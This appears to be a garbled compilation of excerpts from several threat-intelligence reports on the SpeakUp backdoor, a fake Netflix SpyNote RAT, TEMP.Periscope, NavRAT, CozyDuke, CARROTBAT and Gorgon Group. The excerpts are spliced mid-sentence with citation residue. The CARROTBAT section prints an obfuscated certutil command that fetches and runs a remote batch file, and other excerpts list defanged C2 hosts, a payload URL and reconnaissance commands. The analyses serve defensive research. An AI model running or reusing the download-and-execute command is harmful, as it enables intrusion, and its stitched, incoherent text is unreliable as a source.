C2 via the HTTP POST request -1 \u2013 Deletes the buffer and exits the Trojan 009 \u2013 Deletes the buffers and exits the Trojan If neither of the above values are found at the beginning of the HTTP response, the Trojan checks the C2 response for the ASCII representation of hexadecimal bytes First, the DDE instructions heavily rely on the QUOTE field, which converts decimal values to their ASCII equivalent character Also, the author capitalized the \u201cE\u201d in the \u201cdde\u201d command to evade case sensitive signatures Lastly, the author bolded the \u201cdd\u201d characters within the \u201cdde\u201d command, which breaks the string up within the XML of the DOCX file (word/document.xml) to make signature development difficult, as seen here:

In addition to the aforementioned DOCX file, we found another related DDE enabled document\u00a0 based on an infrastructure overlap with a Zebrocy C2 IP address This related delivery document was an RTF file that downloaded and installed a payload used to load the open-source Koadic tool We do not have telemetry on the target or attack vector, but we know the RTF file used DDE to download and execute an executable that loaded Koadic Our analysis shows some possible ties to the Vbs to Exe tool by F2KO Software but we have yet to confirm a direct overlap Unfortunately, we did not observe the Koadic modules used by Sofacy during out analysis", "checkpoint", "April 17, 2019", "SpeakUp: A New Undetected Backdoor Linux Trojan", "Retrieved May 07, 2019.\ncheckpoint", "April 17, 2019",

a new Backdoor Trojan The attack targets worldwide servers including AWS hosted machines Check Point researchers have spotted a new campaign exploiting Linux servers to implant a new Backdoor which evades all security vendors The new Trojan, named \u201cSpeakUp\u201d after one of its command and control names, exploits known vulnerabilities in six different Linux distributions The attack is gaining momentum and targeting servers in East Asia and Latin America, including AWS hosted machines SpeakUp acts to propagate internally within the infected subnet, and beyond to new IP ranges, exploiting remote code execution vulnerabilities In addition, SpeakUp presented ability to infect Mac devices with the undetected backdoor While the exact identity of the threat actor behind this new attack is still unconfirmed, Check Point Researchers were able to correlate SpeakUp\u2019s author with malware developer under the name of Zettabit Although SpeakUp is implemented differently, it has a lot in common with Zettabit\u2019s craftmanship Backdoor The sample we analyzed was observed targeting a machine in China on January 14, 2019 and was first submitted to VirusTotal on January 9 2019 At the time of writing this article, it has no detections in VT To our dismay, the C&C communication was also encoded with the same combination The revealed data contains multiple C&C domains, IP addresses and other unique parameters, along with second-stage payloads and additional modules In the below analysis we will go through the malicious code, reveal the different functions and modules the Trojan runs on the victim\u2019s machine The first POST packet sends a victim ID and more introductory information such as the current version of the installed script (Currently 1.0.4) The immediate first C&C response is \u201cneedrgr\u201d which means the infected victim is new to the server and needs a registration Afterwards, the Trojan posts \u201cfull information\u201d about the machine by executing the following LINUX commands:  Uname (-r, -v, -m, -n,-a, -s) Whoami Ifconfig \u2013a Arp \u2013a cat /proc/cpuinfo | grep -c \u201ccpu family\u201d 2>&1 who \u2013b   Figure 4: The registration process and introductory commands SpeakUp\u2019s Main Functions After the registration process is completed, SpeakUp continuously communicates with its C&C for new tasks on a fixed \u201cknock\u201d interval The following command types are available by the C&C: \u201cnewtask\u201d- Execute arbitrary code on the local machine, download and execute a file from any remote server, kill or uninstall the program and sends updated fingerprint data \u201cnotask\u201d- Sleep for 3 seconds and ask for additional command newerconfig\u201d- Update the downloaded miner configuration file SpeakUp\u2019s persistence is ensured by using cron and an internal mutex to ensure only one instance remains alive at all times Post-Infection Traffic Once the victim is registered successfully, the C&C begins sending new tasks An interesting point to mention is the User-Agents in use SpeakUp defines three User-Agents that the infected machine must use in every communication with its C&C According to XMRHunter the wallets hold a total of ~107 Monero coins Propagation SpeakUp also equips its backdoors with i (sic), a python script which allows the backdoor to scan and infect more Linux servers within its internal and external subnets A successful exploitation of one of the vulnerabilities will result in deploying the original ibus script on the exploited server Attacker Identity and Leads Ibus client for Unix OS Inside the ibus script, we can see a short description about an IBus client for GNU Emacs The IBus client is an open-source multilingual input framework for Linux and Unix OS While it supports all languages that do not use Latin letters, it seems that the main audience is Asian users The description and the file name are the only elements that link SpeakUp to the Ibus framework; the content has no similarities whatsoever This may imply a connection between SpeakUp to East Asia Interestingly enough, the string turned out to be the md5 hash of the word liteHTTP Googling liteHTTP leads to the liteHTTP github project While liteHTTP is a C# based bot which targets Windows clients, its modules are somewhat similar to our SpeakUp Trojan Figure 7: Zettabit`s user description on Hack Forums The Hack Forums profile may imply the author of SpeakUp backdoor is Russian speaking, as many of the comments are written in this language He also seems to be a botnet developer, providing recommendations and publishing his LiteHTTP bot, which seems to have a well-designed GUI interface Another interesting thing to note is the use of the acronym \u201cKnock\u201d on several occasions in his posts It is hard to imagine anyone would build such a compound array of payloads just to deploy few miners The threat actor behind this campaign can at any given time deploy additional payloads, potentially more intrusive and offensive It has the ability to scan the surrounding network of an infected server and distribute the malware This campaign, while still relatively new, can evolve into something bigger and potentially more harmful Indeed, the threat actor behind this campaign, \u2018Zettabithf\u2019 himself, provides some \u2018words of wisdom\u2019 in this

professional life, from booking travel and managing projects, to buying groceries and binge-watching the latest Netflix\u00a0series The iOS and Android apps for Netflix\u00a0are enormously popular, effectively turning a mobile device into a television with which users can stream full movies and TV programs anytime, anywhere But the apps, with their many millions of users, have captured the attention of the bad actors, too, who are exploiting the popularity of Netflix to spread\u00a0malware Recently, the ThreatLabZ research team came across a fake Netflix app, which turned out to be a new variant of SpyNote RAT (Remote Access\u00a0Trojan) Technical details\u00a0 Please note that our research is not about the legitimate\u00a0Netflix app on Google\u00a0Play The spyware in this analysis was portraying itself as the Netflix app Once installed, it displayed the icon found in the actual Netflix app on Google\u00a0Play Figure 2:\u00a0Fake Netflix vs legitimate\u00a0Netflix     As soon as the user clicks the spyware\u2019s icon for the first time, nothing seems to happen and the icon disappears from the home screen This is a common trick played by malware developers, making the user think the app may have been removed But, behind the scenes, the malware has not been removed; instead it starts preparing its onslaught of\u00a0attacks For contacting C&C, the spyware was found to be using free DNS services, as shown in the screenshot\u00a0below:          Figure 3:\u00a0Server\u00a0details     SpyNote RAT uses an unusual trick to make sure that it remains up and running and that the spying does not stop It does so using the Services, Broadcast Receivers,\u00a0and\u00a0Activities components of the Android\u00a0platform Services\u00a0can perform long-running operations in the background and does not need a user interface.\u00a0Broadcast Receivers\u00a0are Android components that can register themselves for particular events Activities are key building blocks, central to an app\u2019s navigation, for\u00a0example The SpyNote RAT registers a service called AutoStartup\u00a0and a broadcast receiver named\u00a0BootComplete.\u00a0 MainActivity\u00a0registers\u00a0BootComplete\u00a0with a boot event, so that whenever the device is booted,\u00a0BootComplete\u00a0gets\u00a0triggered What follows are some of the features exhibited by SpyNote\u00a0RAT Leveraging this feature, the malware developer can root the device using a range of vulnerabilities, well-known or\u00a0zero-day This capability was confirmed when the Android permission, called android.permission.RECORD_AUDIO, was being requested along with code found in the\u00a0app The following screenshot shows the contacts being stolen and written in a local array, which is \u00a0then sent to C&C:          Figure 7:\u00a0Stealing and writing\u00a0contacts     Uninstalling\u00a0apps Uninstalling apps is another function favored by developers of Android spyware

functionality in\u00a0action:          Figure 8:\u00a0Uninstalling\u00a0functionality     Other\u00a0functions In addition to the functionalities we\u2019ve described, the SpyNote RAT was exhibiting many other behaviors that make it more robust than most off-the-shelf\u00a0malware SpyNote RAT was designed to function only over Wi-Fi, which is the preferable mode for Android malware to send files to C&C The screenshot below shows SpyNote RAT scanning for Wi-Fi and enabling it if a known channel is\u00a0found:          Figure 9\u00a0:\u00a0Scanning\u00a0Wi-Fi     Additional\u00a0features -

was to send all the data collected to the C&C over\u00a0Wi-Fi - SpyNote RAT was also collecting the device\u2019s location to identify the exact location of the\u00a0victim What we found were several other fake apps developed using the SpyNote builder, which should come as a warning to Android users Furthermore, we found that in just the first two weeks of 2017, there have been more than 120 such spyware variants already built using the same SpyNote Trojan builder as SpyNote RAT and roaming in the wild A complete list of sample hashes is available here.\u00a0 Conclusion\u00a0 The days when one needed in-depth coding knowledge to develop malware are long gone Nowadays, script kiddies can build a piece of malware that can create real havoc Moreover, there are many toolkits like the SpyNote Trojan builder that enable users to build malware with ease and few\u00a0clicks In particular, avoid side-loading apps from third-party app stores and avoid the temptation to \u00a0play games that are not yet available on Android Yes, we are talking about SuperMarioRun, which was recently launched by Nintendo only for iOS users Recent blogs by the Zscaler research team explain how some variants of Android malware are exploiting the popularity of this game and tricking Android users into downloading a fake version (Have a look\u00a0here\u00a0and\u00a0here.) You should also avoid the temptation to play games from sources other than legitimate app stores; such games are not safe and may bring harm to your reputation and your bank\u00a0account Zscaler users

(FaaS), Mandiant Consulting, and iSIGHT Intelligence teams) has been tracking an ongoing wave of intrusions targeting engineering and maritime entities, especially those connected to South China Sea issues The campaign is linked to a group of suspected Chinese cyber espionage actors we have tracked since 2013, dubbed TEMP.Periscope The group has also been reported as \u201cLeviathan\u201d by other security firms The current campaign is a sharp escalation of detected activity since summer 2017 Like multiple other Chinese cyber espionage actors, TEMP.Periscope has recently re-emerged and has been observed conducting operations with a revised toolkit Known targets of this group have been involved in the maritime industry, as well as engineering-focused entities, and include research institutes, academic organizations, and private firms in the United States FireEye products have robust detection for the malware used in this campaign TEMP.Periscope Background Active since at least 2013, TEMP.Periscope has primarily focused on maritime-related targets across multiple verticals, including engineering firms, shipping and transportation, manufacturing, defense, government offices, and research universities However, the group has also targeted professional/consulting services, high-tech industry, healthcare, and media/publishing Identified victims were mostly found in the United States, although organizations in Europe and at least one in Hong Kong have also been affected TEMP.Periscope overlaps in targeting, as well as tactics, techniques, and procedures (TTPs), with TEMP.Jumper, a group that also overlaps significantly with public reporting on \u201cNanHaiShu.\u201d TTPs and Malware Used In their recent spike in activity, TEMP.Periscope has leveraged a relatively large library of malware shared with multiple other suspected Chinese groups These tools include:  AIRBREAK: a JavaScript-based backdoor also reported as \u201cOrz\u201d that retrieves commands from hidden strings in compromised webpages and actor controlled profiles on legitimate services HOMEFRY: a 64-bit Windows password dumper/cracker that has previously been used in conjunction with AIRBREAK and BADFLICK backdoors LUNCHMONEY: an uploader that can exfiltrate files to Dropbox China Chopper: a simple code injection webshell that executes Microsoft .NET code within HTTP POST commands The following are tools that TEMP.Periscope has leveraged in past operations and could use again, though these have not been seen in the current wave of activity:  Beacon: a backdoor that is commercially available as part of the Cobalt Strike software platform, commonly used for pen-testing network environments BLACKCOFFEE: a backdoor that obfuscates its communications as normal traffic to legitimate websites such as Github and Microsoft's Technet portal Used by APT17 and other Chinese cyber espionage operators Additional identifying TTPs include:  Spear phishing, including the use of probably compromised email accounts Lure documents using CVE-2017-11882 to drop malware Use of bitsadmin.exe to download additional tools Using C:\\Windows\\Debug and C:\\Perflogs as staging directories Leveraging Hyperhost VPS and Proton VPN exit nodes to access webshells on internet-facing systems Using Windows Management Instrumentation (WMI) for persistence Implications The current wave of identified intrusions is consistent with TEMP.Periscope and likely reflects a concerted effort to target sectors that may yield information that could provide an economic advantage, research and development data, intellectual property, or an edge in commercial negotiations As we continue to investigate this activity, we may identify additional data leading to greater analytical confidence

and Paul Rascagneres with contributions from Jungsoo An Executive Summary  Talos has discovered a new malicious Hangul Word Processor (HWP) document targeting Korean users If a malicious document is opened, a remote access trojan that we're calling \"NavRAT\" is downloaded, which can perform various actions on the victim machine, including command execution, and has keylogging capabilities The decoy document is named \"\ubbf8\ubd81 \uc815\uc0c1\ud68c\ub2f4 \uc804\ub9dd \ubc0f \ub300\ube44.hwp\" (Prospects for US-North Korea Summit.hwp) The HWP file format is mainly used in South Korea An Encapsulated PostScript (EPS) object is embedded within the document in order to execute malicious shellcode on the victim systems However, the command and control (C2) infrastructure is very specific The uploaded file(s) are sent by email, and the downloaded files are retrieved from an email attachment We have already observed malware using free email platforms for abuse, but this is the first time we have identified a malware that uses Naver \u2014 which is known for its popularity in South Korea One of the most interesting questions we still have is regarding attribution \u2014 and who is behind this malware Previously, we published several articles concerning Group123 (here, here, here, here and here) We currently assess with medium confidence that this campaign and NavRAT are linked to Group123 This references a legitimate event that could potentially take place on June 12 Here is a screenshot of the document:    This document explains concerns prior to the summit between the U.S and North Korea, which is expected to focus on the topic of denuclearization This document contains the aforementioned EPS object This object is used to execute malicious shellcode on the system This is a seemingly common vector for attackers when using HWP documents, which we have previously encountered and described Malicious Code  As we already mentioned in our previous articles concerning malicious documents, EPS is effective from an attacker's point of view It is a powerful, stack-based scripting language, and in malicious use cases, can be abused to obtain additional payloads In our case, the file URI was: hxxp://artndesign2[.]cafe24[.]com:80/skin_board/s_build_cafeblog/exp_include/img.png  This website is a legitimate Korean website We assume that this website was compromised in order to deliver the final payload on the targeted systems This is a method we have previously observed with attacks focusing on the Korean peninsula This is an example of fileless execution by only running malicious processes within the memory of the victim host The purpose is to drop and execute a decoded executable using the following path: %APPDATA%\\Local\\Temp\\~emp.exe  Once executed, NavRAT will immediately leverage cmd.exe to perform a systeminfo and a tasklist check on the system it is running on while writing the output to a TMP file, once again attempting to hide within an AhnLab folder The analysed sample contains many verbose logs The malware's author logs every action to a file (encoded) It's not often we are able to use the attacker's own logging capability to facilitate analysis, which can make our research easier This screenshot shows the logs messages during the process injection with the API usage NavRAT starts by copying itself (~emp.exe) to the %ProgramData%\\Ahnlab\\GoogleUpdate.exe path It uses the path of a well-known security company located in South Korea named AhnLab NavRAT has support for process injection The malware is able to register the keystrokes on the targeted user's system:    The most interesting part of this RAT is the C2 server architecture The malware uses the Naver email platform in order to communicate with the operators The credentials are hardcoded in the sample:    However, during our investigation, NavRAT was unable to communicate with the email address: [05/30/2018, 17:39:45]  NaverUpload Start!!

many different countries, and the account is currently locked:       The password must be reset by providing information on the account, or with a mobile phone of the owner (the phone number is located in the UK) In its current status, NavRAT cannot work correctly We assume that the owner of the malware didn't know that Naver implemented this protection It is able to remove emails, and finally, it is able to send an email via the Naver account In our sample, the data is attempted to be sent to: chioekang59@daum[.]net Archeology  During our investigation, we tried to find additional samples of NavRAT We only identified one old sample compiled in May 2016 As in our case, this old sample used a fake AhnLab directory to store logs files (C:\\AhnLab\\) In this version, the compilation path was not removed: N:\\CodeProject\\VC_Code Project\\Attack_Spy\\mailacounts.com\\src_total_20160430 - v10.0(DIV)\\bin\\PrecomExe(Win32).pdb  We can conclude that NavRAT has probably existed since 2016 \u2014 which we believe to be version 10 at the time The attacker(s) appear to have remained under the radar for several years We assume this malware has been sparingly used and only for very specific targets We identified some relevant points which we believe with medium confidence suggests the involvement of Group123 based on previous TTPs used by this group The modus operandi is identical to previous Group123 campaigns \u2014 a HWP document with embedded EPS object containing malicious shellcode We saw this exact same methodology used by Group123 during previous attacks One such example is ROKRAT, another remote access trojan we discovered in April 2017 that targeted the Korean peninsula The shellcode used in the EPS object is not exactly the same, but it contains a lot of similarities right down to the number of instructions used, the amount of NOP (No Operations) and almost identical command layout Additionally, we can add the victimology and usage of a public cloud platform as C2 server The attacker simply moved from Yandex, Pcloud, Mediafire, Twitter, and now they are using Naver This platform is mainly used locally in South Korea A connection to this platform cannot be identified as a malicious activity The malicious traffic will be hidden in the global flow Due to all these elements, we asses with medium confidence that NavRAT and this campaign can be linked to Group123 The malware developer is probably a different person within Group123's working team, but the infection framework and the operating mode are the same When Talos published on Olympic Destroyer we were able to see a lot of false flags used When we look at NavRAT we do not see this intentional and less vague level of IOC/False Flag scenarios in an attempt to infer attribution to another entity NavRAT lacks these non-obvious false flags and thus we do not believe this to be related to non Group123 actors Conclusion  South Korea is still, and always will remain, an attractive target for advanced actors The region has geopolitical interests that arise from the segregations that exist between the secretive North Korea and the more open South Korea In this campaign, the attackers used a classical HWP document in order to download and execute a previously unknown malware: NavRAT The author used real events in order to forge the decoy document It chose the U.S - North Korea Summit to entice the targets to open it The approach is close to the techniques used by Group123 attacks we have observed and written about over the past 18 months or so: the shellcode contains similarities, the final payload is malicious shellcode located in an image hosted on a compromised website, and the author uses an open platform as the C2 server In this case, NavRAT used an email provider: Naver, while ROKRAT previously used cloud providers And finally, the victimology and the targeted region are the same All these elements are not strict proof of a link between NavRAT and ROKRAT However, we asses with medium confidence that NavRAT is linked to Group123 Using well-known local cloud/email providers is smart from an attacker's point of view It's really hard to identify the malicious traffic in the middle of the legitimate traffic In this case, the email provider locked the account due to attempts from too many different countries to access the email inbox We identified the sample on several public sandbox systems, and we assume the multiple connection attempts were performed by these sandboxes Coverage  Additional ways our customers can detect

this component was cobbled together with its dropper, partly regionally based on target selection K7 KASPERSKY AVG The code collects information about the system and xml formats this data prior to encryption for proper parsing:  Finally, this process beacons to www.sanjosemaristas.com, which appears to be a site that has been compromised and misused multiple times in the past couple of years It uses standard Win32 base cryptography functions to generate a CALG_RC4 session key to encrypt the collected data communications and POSTs it to the server Here\u2019s how it looks decrypted:  Second stage malware and communications: The attackers send commands and new modules to be executed to the victims through the C&Cs The C&C scripts store these temporarily until the victim next connects to retrieve\u00a0local files Decoding them resulted in the following payloads: 59704bc8bedef32709ab1128734aa846, ChromeUpdate.ex_ 5d8835982d8bfc8b047eb47322436c8a, cmd_task.dll

repeated is configurable within the xml task file cmd_task.dll is a 32-bit dll that maintains several primitives Each of these payloads is delivered together with a configuration file that explains how to run it, for instance:  In another tasking, we notice a tracked victim:  Attackers map a network drive use Microsoft OneDrive to run further tools:  They copy down a base64 encoded document from Microsoft OneDrive to the victim system and decode it there:  Not everything works as planned, so they maintain error reporting facility\u00a0for\u00a0the c2 communications:  Furthermore, ChromeUpdate is a 64-bit executable (which appears to be a WEXTRACT package) that oddly drops a 32-bit Dll Cache.dll is simply stored as a cabinet file in the ChromeUpdate\u2019s resource section It maintains eight exports, including DllMain: ADB_Add ADB_Cleanup ADB_Initnj ADB_Load ADB_Release ADB_Remove ADB_Setup ADB_Setup is a entry point that simply spawns another thread and waits for completion Above, we see a new thread created with the start address of Cache.dll export \u00a0\u201cADB_Load\u201d by the initial thread This exported function is passed control while the initial thread runs a Windows

Connections with MiniDuke/CosmicDuke/OnionDuke: One of the second stage modules of CozyDuke/Cozy Bear, Show.dll, is particularly interesting because it appears to have been built onto the same platform as OnionDuke Below we compare Show.dll with the OnionDuke sample MD5: c8eb6040fd02d77660d19057a38ff769 Both have exactly the same export tables and appear to be called internally \u201cUserCache.dll\u201d:  This seems to indicate the authors of OnionDuke and CozyDuke / Cozy Bear are the same, or working together Another interesting comparison of two other files matches a recent second stage tool from the CozyDuke attacks with a second stage component from other Miniduke/Onionduke attacks The table below presents the function matches based on size data, but the calls, jmps and code all match as well The contents of only one of these exports in update.dll has no match whatsoever in cache.dll Unlike the atiumdag.dll file above, however, cache.dll and update.dll do not maintain anti-AV and anti-analysis functionality sets This rotating functionality seems representational for the set, along with other characteristics Their custom backdoor components appear to slightly evolve over time, with modifications to anti-detection, cryptography, and trojan functionality changing per operation This rapid development and deployment reminds us of the APT28/Sofacy

Korea region These lures revolve around a series of subjects, including various cryptocurrencies, cryptocurrency exchanges, and political events Based on various information witnessed within this dropper, Unit 42 has dubbed this malware family CARROTBAT CARROTBAT was initially discovered in an attack on December 2017 This attack was made against a British government agency using the SYSCON malware family SYSCON is a simple remote access Trojan (RAT) that uses the file transfer protocol (FTP) for network communications While there is no evidence that this attack against a British government agency made use of the CARROTBAT dropper, we found overlaps within this attack\u2019s infrastructure that ultimately lead us to CARROTBAT\u2019s initial discovery, as well as other ties between these two malware families These samples began appearing in March of this year, with the majority of activity taking place within the past 3 months The payloads vary, as earlier instances delivered SYSCON, while newer instances are delivering the previously reported OceanSalt malware family CARROTBAT and their associated payloads constitute a campaign that we are dubbing \u2018Fractured Block\u2019 This email contained the following subject, with an attached document file of the same name:  US would talk with North Korea \u201cwithout precondition\u201d  Within this attached Word document, the following text is displayed: U.S would talk with North Korea \u201cwithout precondition\u201d: Tillerson, By Seungmock Oh This text references an article that was published on the same day as the attack by NKNews[.]org The article in question discusses diplomatic ties between the United States and North Korea The command run by this particular malware sample attempts to download a remote executable file named 0_31.doc, which in turn is placed within the victim\u2019s %TEMP% directory with the filename of AAA.exe prior to being executed The payload in question belongs to the SYSCON malware family Pivoting further on characteristics belonging to CARROTBAT ultimately led to the identification of 29 unique samples in this malware family Fractured Block Campaign The campaign dubbed Fractured Block encompasses all CARROTBAT samples identified to date In total, the following 11 decoy document file formats are supported by this malware:  doc .docx .eml .hwp .jpg .pdf .png .ppt .pptx .xls .xlsx  After the embedded decoy document is opened, an obfuscated command such as the following is executed on the system:C: && cd %TEMP% && c^e^r^tutil -urlca^che -spl^it -f https://881.000webhostapp[.]com/1.txt && ren 1.txt 1.bat && 1.bat && exitThis command will attempt to download and execute a remote file via the Microsoft Windows built-in certutil utility More information on this technique and the CARROTBAT malware family may be found within the Appendix The 29 unique CARROTBAT malware samples have compile timestamps between March 2018 to September 2018 Of these 29 unique samples, 11 unique decoy documents were leveraged in attacks, as seen in the figure below:  Figure 3 Timeline of decoy documents being dropped by CARROTBAT \u00a0 A majority of the decoy documents targeting victims in Korea had subject matter related to cryptocurrencies In one unique case, the decoy contains a business card belonging to an individual working at COINVIL, which is an organization that announced plans to build a cryptocurrency exchange in the Philippines in May 2018 Additional lure subjects included timely political events, such as relations between the U.S and North Korea, as well as a trip by U.S President Donald Trump to a summit in Singapore Payloads for the CARROTBAT samples varied Originally, between the periods of March 2018 to July 2018, multiple instances of the SYSCON malware family were observed These samples continue to be used at the time of this writing, and were observed communicating with the following host for C2 communication:  61.14.210[.]72:7117  \u00a0 Interesting Ties with Other Threat Activity As stated earlier within this blog, there is infrastructure overlap between the CARROTBAT and KONNI malware families This particular malware family has yet to be attributed to a named group at the time of this writing, however, targeting has historically focused on the Southeast Asia region Another relationship we have mentioned repeatedly is the use of the SYSCON malware family This particular malware family was first reported in October 2017 and has been observed delivering decoy documents pertaining to North Korea The malware is generally unsophisticated, making use of remote FTP servers for C2 communication Below you can see the KONNI usage highlighted in the gold flags and SYSCON highlighted in the purple flags Figure 4 Maltego diagram correlating malicious activity \u00a0 Finally, the third overlap is the OceanSalt malware payload First reported by McAfee in October 2018, reported victims include South Korea, the United States, and Canada Like the samples outlined in the McAfee report, the OceanSalt samples observed in the Fractured Block Campaign employed the same code similarities as those of Comment Crew (aka APT1), however, we believe that these code similarities are a false flag The malware used by Comment Crew has been in circulation for many years, and we do not believe the activity outlined in this blog post has any overlap with the older Comment Crew activity Figure 5 Threat activity overlap over time Conclusion Finding CARROTBAT provided an important lynchpin in identifying Fractured Block Campaign activity Using CARROTBAT, we were able to find related OceanSalt, SYSCON and KONNI activity The various overlaps encountered are notable, and it is our suspicion that this threat activity may all belong to the same threat actor However, we do not believe there to be enough evidence at this time to make this claim with complete certainty While the actors behind Fractured Block remain active, Palo Alto Networks customers are protected from this threat in the following ways:  AutoFocus customers can track these samples with the FracturedBlock, SYSCON, KONNI, and CARROTBAT WildFire detects all files mentioned in this report with malicious verdicts Traps blocks all of the files currently associated with the Fractured Block campaign A special thanks to Chronicle\u2019s VirusTotal team for their assistance researching this threat Appendix CARROTBAT Technical Analysis \u00a0For the analysis below, the following sample is used:    MD5

80386, for MS Windows   Compile Timestamp 2018-09-05 00:17:22 UTC    \u00a0 Upon execution, the malware will read the last 8 bytes of itself These bytes include two DWORDs that contain both the length of the embedded decoy document, as well as the type of file it is Figure 6 End of CARROTBAT file containing decoy document information \u00a0 Using this gathered information, CARROTBAT continues to read the end of itself, minus the previously retrieved 8 bytes This data contains the entirety of the embedded decoy document and is written to the same directory and filename as the original malware sample However, the file extension is changed based on the previously retrieved file type value The following corresponding values are used by CARROTBAT:    Value Document Extension   0x0 .doc   0x1 .pdf   0x2 .jpg   0x3 .xls   0x4 .xlsx   0x5 .hwp   0x6 .docx   0x7 .png   0x8 .eml   0x9 .ppt   0xA .pptx    In this particular case, the .hwp file extension is used for the decoy document After the decoy is dropped to disk, it is opened in a new process In this instance, the whitepaper for the BKN Bank cryptocurrency exchange is displayed to the victim:  Figure 7 HWP decoy document displayed to victim \u00a0 After this document is displayed, the malware will continue to execute the following command in a new process:C: && cd %TEMP% && c^e^r^tutil -urlca^che -spl^it -f

Subaat, an attacker, since 2017 Recently Subaat drew our attention due to renewed targeted attack activity Part of monitoring Subaat included realizing the actor was possibly part of a larger crew of individuals responsible for carrying out targeted attacks against worldwide governmental organizations Technical analysis on some of the attacks as well as attribution links with Pakistan actors have been already depicted by 360 and Tuisec, in which they found interesting connections to a larger group of attackers Unit 42 researchers have been tracking, which we are calling Gorgon Group In addition to the numerous targeted attacks, Unit 42 discovered that the group also performed a litany of attacks and operations around the globe, involving both criminal as well as targeted attacks Starting in February 2018, Palo Alto Networks Unit 42 identified a campaign of attacks performed by members of Gorgon Group targeting governmental organizations in the United Kingdom, Spain, Russia, and the United States Additionally, during that time, members of Gorgon Group were also performing criminal operations against targets across the globe, often using shared infrastructure with their targeted attack operations Gorgon Group\u2019s activity is interesting because in addition to traditional command and control (C2) domain utilization, Gorgon Group used common URL shortening services to download payloads; ultimately providing an extensive list of click counts and statistical data Also, interestingly, Gorgon Group has a diverse and active criminal element On much of the C2 infrastructure we identified several crimeware family samples RATs such as NjRat and infostealers like Lokibot were leveraging the same C2 infrastructure as that of the targeted attacks Using numerous decoy documents and phishing emails, both styles of attacks lacked overall sophistication, but the effectiveness of this group and campaign cannot be denied Attack Delivery and Infrastructure Analysis The attack methodology, as well as analysis of several of the \u201c.vbs\u201d, \u201c.doc\u201d and \u201c.exe\u201d samples found hosted in the attacker\u2019s infrastructure has been covered by 360 and Tuisec Both 360 and Tuisec found that the most commonly observed and consistent attack pattern consists of the following stages:  Figure 1 Basic attacker methodology At the initial stage, the phishing attempts are kept very simple and lightweight by using OLE2Link objects that will usually make use of URL shortening services such as Bitly and t2m[.]io Figure 2 OLE2Link content example \u00a0 While investigating the domains and infrastructure used by the phishing components of Gorgon Group, Unit 42 researchers witnessed several common operational security flaws with Gorgon Group\u2019s actors throughout their many campaigns It was one of these OPSEC failures that gave us an interesting cross-section of malware Gorgon Group is using Additionally, there was a plethora of malware samples that were criminal in nature Figure 3 Examples of domain patterns The Gorgon Group Crew Breakdown Finding accessible directories, in combination with their other operational security failures, made it easy to start connecting the dots on Gorgon Group members 360 and Tuisec already identified some Gorgon Group members In addition to Subaat, we counted an additional four actors performing attacks as part of Gorgon Group While it\u2019s not known if the attackers physically reside in Pakistan, all members of Gorgon Group purport to be in Pakistan based on their online personas fudpages  One member of Gorgon Group- we\u2019re calling \u2018fudpages\u2019, was found during this campaign activity based on their utilization of shared infrastructure One specific Microsoft document drew our attention (446e1c80102c8b9662d66d44525cb9f519369061b02446e0d4cd30cd26d79a25) This Microsoft Word document was sent via email to several industries across the US and Switzerland We noticed that this document pulls down additional malware from a C2 also being used in attacks by other Gorgon Group members.\u00a0 Additionally, this document communicates to a relatively new piece of C2 infrastructure- umarguzardijye[.]com, which is hosted on 91[.]234[.]99[.]206 Figure 4 WHOIS information for umarguzardijye[.]com Fudpages, similar to other Gorgon Group members, made many of the same OPSEC failures of his or her fellow Gorgon Group members Figure 5 Open directory of umarguzardijye[.]com The WHOIS record for our new domain, umarguzardijye[.]com, shows that the registrant organization is \u201cfudpages\u201d and the address provided in Pakistan When looking closer at the IP hosting umarguzardijye[.]com, we noticed 91[.]234[.]99[.]206 hosts two additional domains that drew our attention-fudpages[.]ru and fudpage[.]ru Fudpage appears to be a small marketplace selling bulletproof hosting, RDP sessions, fake documents and a litany of additional malicious wares Figure 6 Advertisement website for FUD pages and spamming tools Listed on fudpage\u2019s marketplace are several pieces of contact information, which ultimately led us to an underground persona that was selling, distributing and trading maliciousness across underground forums Figure 7 Underground forum posting for RAT Operating underground since at least 2016, fudpages is also active on streaming sites like Youtube, where they use it as an advertising platform Figure 8 Youtube video posting on how to perform malicious activities Like all of Gorgon Group\u2019s members, Fudpage\u2019s online profile, infrastructure utilization and standardization, connects them back to Gorgon Group This connection to Gorgon Group helps illustrate the seemingly standardized methodologies Gorgon Group most often employs The Tale of Two Intentions: Criminal and Targeted As part of the investigation, Unit 42 researchers were able to identify an interesting characteristic about how the Gorgon Group crew uses shared infrastructure between cybercrime and targeted attacks The crew combines both regular crime and targeted attack objectives using the same domain infrastructure over time, rarely changing their TTPs Starting in mid-February, Unit 42 researchers have been tracking an active campaign sharing a significant portion of infrastructure leveraged by Gorgon Group for criminal and targeted attacks Overlap between infrastructure While looking at the total cluster of Gorgon Group activity, it\u2019s also interesting to look at the total click volume during the campaign\u2019s timeframe Leveraging click counts for the campaign for Bitly, we were able to see Gorgon Group\u2019s activity volume increase throughout April Figure 10 Total clicks performed on Gorgon Group infrastructure over time Looking specifically at one domain used in both cybercrime and targeted attacks, we can see a micro viewpoint into their campaign Between April 1, 2018 and May 30, 2018, we observed the domain stevemike-fireforce[.]info used in a Gorgon Group cybercrime campaign involving more than 2,300 emails and 19 documents in the initial attack This same domain was also used during the same period of time in targeted attacks against several worldwide nation state agencies Analysis of the data allowed Unit 42 researchers to make some interesting conclusions:  Several unique domains are used for both cybercrime and targeted attacks The amount of sessions for cybercrime is higher than targeted, as expected There is no specific pattern on when targeted attacks happen, the domains can initially be used for cybercrime and then quickly utilized in a targeted attack with little warning As a graphical representation, Figure 11, below, indicates the amount of unique sessions observed for this domain over the campaign\u2019s operational time, representing the attack intention in two separate areas It\u2019s interesting to observe on April 24th, this domain delivers a targeted attack aimed at several worldwide governmental bodies, in the middle being of also being used in the delivery of a malspam campaign The subject used in this case of targeted attack was \u201cPakistan eying Sukhoi-35 figther planes as part of defense deal from Rusia\u201d: \u00a0  Figure 11 Crimeware activity versus targeted activity against stevemike-fireforce[.]info In order to have a better idea of the volume of unique attacks per date and intention, see the following volume-based representation in Figure 12, where targeted attack volumes are represented in red and crime in green:  Figure 12 Volume of crimeware activity versus targeted attacks using stevemike-fireforce[.]info Focusing on one domain allowed us to quickly understand its usage and better understand how it interconnects to a larger malspam campaign Intention #1: Cybercrime Criminal attacks are not new to this crew, some of which was covered in our previous blog for Gorgon Group member Subaat During the current campaign, Gorgon Group\u2019s criminal enterprises netted 132,840 Bitly clicks from mid-February to the present Targeting a large cross-section of industries, there was little in terms of targeting during their criminal activity Figure 13 Criminal Attacks Bitly Link Clicks Worldwide A majority of the crimeware distribution was done via standard malspam campaigns leveraging well-known 